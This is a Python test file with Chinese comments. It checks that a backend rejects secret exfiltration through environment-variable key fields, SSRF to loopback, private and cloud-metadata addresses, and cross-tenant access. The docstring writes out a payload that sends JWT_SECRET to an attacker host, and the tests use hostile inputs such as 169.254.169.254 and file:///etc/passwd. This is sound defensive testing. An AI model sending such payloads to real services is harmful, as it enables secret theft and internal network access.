"""出站安全护栏：密钥外发（api_key_env / auth_env_var）与 SSRF。

## 为什么这组用例存在

两条真实的高危链路：

1. `POST /models/providers/list-models` 的 body 同时接受 `base_url` 与
   `api_key_env`，服务端会把该环境变量值当作 `Authorization: Bearer`
   发到调用方指定的任意地址。`{"base_url":"https://attacker.tld",
   "api_key_env":"JWT_SECRET"}` 即可窃取 JWT 签名密钥 → 伪造任意用户；
   `external_agents.auth_env_var` 是同一手法的第二入口。
2. webhook / 网页抓取等「用户提供 URL」的端点没有拦住回环、私网与云元数据
   地址，云主机上可被用来打内网。

本组用例把这两类边界钉死：改回去就会立刻变红。
"""
from __future__ import annotations

import pytest

pytestmark = pytest.mark.asyncio

# 元数据地址：即使 allow_private=True（本地模型服务）也必须拒绝
_METADATA_URL = "http://169.254.169.254/latest/meta-data/"
_LOOPBACK_URL = "http://127.0.0.1:1/"


# --------------------------------------------------------------- list-models

async def test_list_models_rejects_api_key_env_from_environment(
        client, make_user):
    """`api_key_env=JWT_SECRET` 必须 400，绝不能读取并外发。"""
    user = await make_user()
    r = await client.post("/models/providers/list-models", json={
        "base_url": "https://example.com/v1",
        "api_key_env": "JWT_SECRET",
    }, headers=user["headers"])
    assert r.status_code == 400, f"仍允许从环境变量取密钥：{r.status_code} {r.text}"
    assert "安全" in r.text


async def test_list_models_rejects_any_api_key_env_even_harmless_name(
        client, make_user):
    """即使变量名合法但不存在，也不再支持——统一 400，不留“探测”空间。"""
    user = await make_user()
    r = await client.post("/models/providers/list-models", json={
        "base_url": "https://example.com/v1",
        "api_key_env": "OPENAI_API_KEY",
    }, headers=user["headers"])
    assert r.status_code == 400, f"api_key_env 通道未关闭：{r.status_code} {r.text}"


async def test_list_models_rejects_cloud_metadata_url(client, make_user):
    """本地模型允许私网，但云元数据地址在任何场景都必须拒绝。"""
    user = await make_user()
    r = await client.post("/models/providers/list-models", json={
        "base_url": _METADATA_URL,
        "api_key": "sk-test",
    }, headers=user["headers"])
    assert r.status_code == 400, f"元数据地址未被拦截：{r.status_code} {r.text}"


async def test_list_models_rejects_unknown_provider_type(client, make_user):
    user = await make_user()
    r = await client.post("/models/providers/list-models", json={
        "base_url": "http://127.0.0.1:11434/v1",
        "api_key": "sk-test-123456",
        "provider_type": "not-a-provider",
    }, headers=user["headers"])
    assert r.status_code == 400, r.text


async def test_list_models_uses_provider_specific_auth_header(client, make_user,
                                                              monkeypatch):
    """Anthropic 用 x-api-key，OpenAI 兼容用 Bearer——发错头就是 401。

    这里替换掉 httpx.AsyncClient，只验证出站请求的 URL 与鉴权头，
    不发起真实网络请求。
    """
    import httpx

    captured: dict = {}

    class _FakeResp:
        status_code = 200

        def json(self):
            return {"data": [{"id": "claude-3-5-sonnet-latest"}]}

    class _FakeClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def get(self, url, headers=None):
            captured["url"] = url
            captured["headers"] = headers or {}
            return _FakeResp()

    monkeypatch.setattr(httpx, "AsyncClient", _FakeClient)
    user = await make_user()

    r = await client.post("/models/providers/list-models", json={
        "base_url": "http://127.0.0.1:11434/v1",
        "api_key": "sk-ant-1234567890",
        "provider_type": "anthropic",
    }, headers=user["headers"])
    assert r.status_code == 200, r.text
    assert r.json()["models"] == ["claude-3-5-sonnet-latest"]
    assert captured["url"] == "http://127.0.0.1:11434/v1/models"
    assert captured["headers"]["x-api-key"] == "sk-ant-1234567890"
    assert "Authorization" not in captured["headers"]

    r = await client.post("/models/providers/list-models", json={
        "base_url": "http://127.0.0.1:11434/v1",
        "api_key": "sk-ant-1234567890",
    }, headers=user["headers"])
    assert r.status_code == 200
    assert captured["headers"]["Authorization"] == "Bearer sk-ant-1234567890"


# ------------------------------------------------------------------- notify

async def test_command_notify_rejects_loopback_webhook(client, make_user):
    user = await make_user()
    r = await client.post("/command/notify", json={
        "report": "测试报告",
        "webhook": _LOOPBACK_URL,
    }, headers=user["headers"])
    assert r.status_code == 400, f"回环 webhook 未被拦截：{r.status_code} {r.text}"


# ------------------------------------------------------------- browser-agent

async def test_browser_fetch_rejects_loopback_url(client, make_user,
                                                  make_company):
    user = await make_user()
    co = await make_company(user)
    r = await client.post(
        "/browser-agent/fetch",
        params={"company_id": co["id"]},
        json={"url": _LOOPBACK_URL},
        headers=user["headers"])
    assert r.status_code in (400, 403), \
        f"回环地址未被拒绝：{r.status_code} {r.text}"


async def test_browser_fetch_rejects_other_company(client, tenants):
    """不能借 company_id 参数用他人公司身份抓取。"""
    r = await client.post(
        "/browser-agent/fetch",
        params={"company_id": tenants.bob_co["id"]},
        json={"url": "https://example.com/"},
        headers=tenants.alice["headers"])
    assert r.status_code == 404, f"越权公司未被拒绝：{r.status_code} {r.text}"


# ------------------------------------------------------------ external agents

async def test_external_agent_rejects_sensitive_auth_env_var(
        client, make_user, make_company):
    """auth_env_var=JWT_SECRET + 任意 endpoint 是第二个密钥外发入口。"""
    user = await make_user()
    co = await make_company(user)
    r = await client.post(
        "/external-agents",
        params={"company_id": co["id"]},
        json={"name": "evil", "provider_type": "API",
              "endpoint": "https://example.com/v1",
              "auth_env_var": "JWT_SECRET"},
        headers=user["headers"])
    assert r.status_code == 400, f"敏感环境变量未被拒绝：{r.status_code} {r.text}"


async def test_external_agent_rejects_non_allowlisted_env_var(
        client, make_user, make_company):
    user = await make_user()
    co = await make_company(user)
    r = await client.post(
        "/external-agents",
        params={"company_id": co["id"]},
        json={"name": "weird", "provider_type": "API",
              "endpoint": "https://example.com/v1",
              "auth_env_var": "PATH"},
        headers=user["headers"])
    assert r.status_code == 400, f"非白名单变量未被拒绝：{r.status_code} {r.text}"


async def test_external_agent_rejects_metadata_endpoint(
        client, make_user, make_company):
    user = await make_user()
    co = await make_company(user)
    r = await client.post(
        "/external-agents",
        params={"company_id": co["id"]},
        json={"name": "meta", "provider_type": "API",
              "endpoint": _METADATA_URL,
              "auth_env_var": "OPENAI_API_KEY"},
        headers=user["headers"])
    assert r.status_code == 400, f"元数据 endpoint 未被拦截：{r.status_code} {r.text}"


async def test_external_agent_endpoints_are_company_scoped(client, tenants):
    """按 id 的 test/enable/execute/delete 不能跨租户操作。"""
    a = tenants.alice
    r = await client.post(
        "/external-agents",
        params={"company_id": tenants.bob_co["id"]},
        json={"name": "bob-agent", "provider_type": "API",
              "endpoint": "https://1.1.1.1/v1"},
        headers=tenants.bob["headers"])
    assert r.status_code == 201, r.text
    cid = r.json()["id"]

    for method, path in (
            ("post", f"/external-agents/{cid}/test"),
            ("post", f"/external-agents/{cid}/enable"),
            ("post", f"/external-agents/{cid}/execute"),
            ("delete", f"/external-agents/{cid}")):
        kwargs = {"headers": a["headers"]}
        if path.endswith("/execute"):
            kwargs["json"] = {"task_input": "hi"}
        resp = await getattr(client, method)(path, **kwargs)
        assert resp.status_code == 404, \
            f"{method.upper()} {path} 允许越权：{resp.status_code} {resp.text}"

    # 反向对照：归属者仍可正常操作
    resp = await client.post(f"/external-agents/{cid}/enable",
                             headers=tenants.bob["headers"])
    assert resp.status_code == 200, resp.text


# ------------------------------------------------- 运行时兜底（历史遗留 model 行）

async def test_runtime_key_resolution_refuses_sensitive_env_names(monkeypatch):
    """写库校验之外的兜底：升级前落库（或直接改库）的敏感 api_key_env
    在运行时也取不到值，否则「保存时拦住了、跑任务时照样外发」。"""
    from app.core.config import settings
    from app.model_gateway import _resolve_api_key
    from app.models.agent import ModelProviderType

    monkeypatch.setenv("AIEOS_RUNTIME_JWT_SECRET", "leaked-secret")
    assert settings.resolved_api_key("AIEOS_RUNTIME_JWT_SECRET") == ""

    class _LegacyModel:
        api_key_env = "AIEOS_RUNTIME_JWT_SECRET"
        provider_type = ModelProviderType.OPENAI_COMPAT

    assert _resolve_api_key(_LegacyModel()) != "leaked-secret"


# --------------------------------------------------------- 自动化 call_webhook

async def test_automation_call_webhook_blocks_private_and_metadata(monkeypatch):
    """自动化步骤里用户填的 webhook URL 同样不可信。

    改造前 `call_webhook` 直接 `httpx.request(url)`：配一个
    `http://169.254.169.254/...` 就能让服务端替调用方打内网/云元数据。
    """
    from app.automation_engine import _execute_step

    for url in (_METADATA_URL, _LOOPBACK_URL, "file:///etc/passwd"):
        with pytest.raises(ValueError) as ei:
            await _execute_step(None, "c1", {
                "type": "call_webhook", "params": {"url": url}},
                mode="LIVE", run_id="r1", depth=0)
        assert "拒绝" in str(ei.value), f"{url} 未被拦截：{ei.value}"
